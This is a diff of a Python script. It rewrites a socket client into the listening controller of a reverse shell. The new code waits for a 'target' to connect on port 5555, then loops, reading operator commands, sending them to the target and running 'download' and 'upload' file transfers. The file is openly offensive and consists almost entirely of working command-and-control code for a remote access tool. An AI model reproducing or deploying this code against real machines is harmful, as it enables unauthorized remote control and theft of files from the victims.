@@ -1,8 +1,8 @@
-import socket
 import os
+import socket
 import json
 
-SERVER_IP = '10.0.1.37'
+SERVER_IP = '0.0.0.0'
 SERVER_PORT = 5555
 
 def reliable_send(data):
@@ -36,5 +36,18 @@ def download_file(filename):
     target_sock.settimeout(None)
     file.close()
 
-target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-target_sock.connect((SERVER_IP, SERVER_PORT))
+server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_sock.bind((SERVER_IP, SERVER_PORT))
+
+print('[+] Listening For Incoming Connections')
+server_sock.listen(5)
+target_sock, target_ip = server_sock.accept()
+print(f'[+] Target Connected From: {str(target_ip)}')
+
+while True:
+    command = input(f'* Shell~{str(target_ip)}: ')
+    reliable_send(command)
+    if command[:9] == 'download ':
+        download_file(command[9:])
+    elif command[:7] == 'upload ':
+        upload_file(command[7:])
